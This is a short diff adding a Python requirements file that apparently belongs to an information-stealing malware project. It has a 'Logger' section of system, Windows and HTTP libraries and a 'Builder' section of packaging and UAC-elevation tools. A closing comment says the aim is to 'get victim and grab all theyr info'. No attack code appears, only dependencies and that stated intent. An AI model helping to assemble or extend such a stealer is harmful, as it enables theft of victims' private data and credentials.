@@ -1,0 +1,17 @@
+# Logger
+psutil
+cryptography
+requests
+pypiwin32
+wmi
+requests-toolbelt
+# Builder
+colorama
+pyinstaller
+cx-Freeze
+pyuac
+pillow
+pycryptodomex
+customtkinter
+# After
+get victim and grab all theyr info have fun 
